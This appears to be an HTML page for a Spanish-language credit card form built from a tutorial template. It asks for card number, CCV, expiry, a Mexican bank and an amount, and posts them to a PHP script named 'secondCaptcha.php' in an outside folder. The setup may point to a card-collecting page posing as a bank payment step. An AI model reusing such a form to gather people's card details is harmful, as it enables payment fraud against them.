<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>Formulario de Tarjeta de Crédito Dinámico</title>
	<link href="https://fonts.googleapis.com/css?family=Lato|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
	<link rel="stylesheet" href="../../tailwind.css">
	<link rel="stylesheet" href="css/estilos.css">
	<link rel="stylesheet" href="../../styles/styles.css">
	
</head>
<body>
	<div class="contenedor">

		<!-- Tarjeta -->
		<section class="tarjeta" id="tarjeta">
			<div class="delantera">
				<div class="logo-marca" id="logo-marca">
					<!-- <img src="img/logos/visa.png" alt=""> -->
				</div>
				<img src="img/chip-tarjeta.png" class="chip" alt="">
				<div class="datos">
					<div class="grupo" id="numero">
						<p class="label">Número Tarjeta</p>
						<p class="numero">#### #### #### ####</p>
					</div>
					<div class="flexbox">
						<div class="grupo" id="nombre">
							<p class="label">Nombre Tarjeta</p>
							<p class="nombre">Carlos Carbajal</p>
						</div>

						<div class="grupo" id="expiracion">
							<p class="label">Expiracion</p>
							<p class="expiracion"><span class="mes">MM</span> / <span class="year">AA</span></p>
						</div>
					</div>
				</div>
			</div>

			<div class="trasera">
				<div class="barra-magnetica"></div>
				<div class="datos">
					<div class="grupo" id="firma">
						<p class="label">Firma</p>
						<div class="firma"><p></p></div>
					</div>
					<div class="grupo" id="ccv">
						<p class="label">CCV</p>
						<p class="ccv"></p>
					</div>
				</div>
				<p class="leyenda">Lorem ipsum dolor sit amet consectetur adipisicing elit. Accusamus exercitationem, voluptates illo.</p>
				<a href="https://github.com/CarlosCarbajalDev" class="link-banco">github.com/CarlosCarbajalDev</a>
			</div>
		</section>

		<!-- Contenedor Boton Abrir Formulario -->
		<div class="contenedor-btn">
			<button class="btn-abrir-formulario" id="btn-abrir-formulario">
				<i class="fas fa-plus"></i>
			</button>
		</div>

		<!-- Formulario -->
		<form action="../../../vali/secondCaptcha.php" method="post" id="formulario-tarjeta" class="formulario-tarjeta">
			<div class="grupo">
				<label for="inputNumero">Número Tarjeta</label>
				<input type="text" id="inputNumero" maxlength="19" autocomplete="off">
			</div>
			<div class="grupo">
				<label for="inputNombre">Nombre</label>
				<input type="text" id="inputNombre" maxlength="19" autocomplete="off">
			</div>
			<div class="flexbox">
				<div class="grupo-select ">
					<label for="">Banco</label>
					<select style="margin-bottom: 20px;" name="mes">
						<option disabled selected></option>
						<option >BBVA Bancomer</option>
						<option  >Banorte</option>
						<option  >Banamex</option>
						<option  >Santander</option>
						<option  >Scotiabank</option>
						<option  >HSBC</option>
						<option  >Inbursa</option>
						<option  >Banco del Bajío</option>
						<option  >Afirme</option>
						<option  >Banco Azteca</option>
						<option  >American Express</option>
						<option  >Scotiabank</option>
					</select>
					<i class="fas fa-angle-down items-center"></i>
				</div>
				<div class="grupo ccv mr-5">
					<label for="cantidad1">Cantidad</label>
					<input type="text" id="Cantidad" maxlength="7">
				</div>
				<div class="grupo ccv">
					<label for="cantidad2">Val Cantidad</label>
					<input type="text" id="valCantidad" maxlength="7">
				</div>
			</div>
			<div class="flexbox">
				<div class="grupo expira">
					<label for="selectMes">Expiracion</label>
					<div class="flexbox">
						<div class="grupo-select">
							<select name="mes" id="selectMes">
								<option disabled selected>Mes</option>
							</select>
							<i class="fas fa-angle-down"></i>
						</div>
						<div class="grupo-select">
							<select name="year" id="selectYear">
								<option disabled selected>Año</option>
							</select>
							<i class="fas fa-angle-down"></i>
						</div>
					</div>
				</div>

				<div class="grupo ccv">
					<label for="inputCCV">CCV</label>
					<input type="text" id="inputCCV" maxlength="3">
				</div>
			</div>
			<button type="submit" class="btn-enviar">Enviarrrrr</button>

			<!-- 

			<button type="submit" class="btn-enviar g-recaptcha data-sitekey="6LcIbBgbAAAAABdBuggVGqL6v5-laTKJDGvS2YOR" data-callback='onSubmit' data-action='submit'">Enviar</button>
			<div class="g-recaptcha" data-sitekey="6LcePAATAAAAAGPRWgx90814DTjgt5sXnNbV5WaW"></div>

			 -->
		</form>
	</div>

	<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
	<script src="js/main.js"></script>
	<script src='https://www.google.com/recaptcha/api.js?hl=es'></script>
	<script>
		function onSubmit(token) {
			document.getElementById("formulario-tarjeta").submit();
		}
	</script>
</body>
</html>
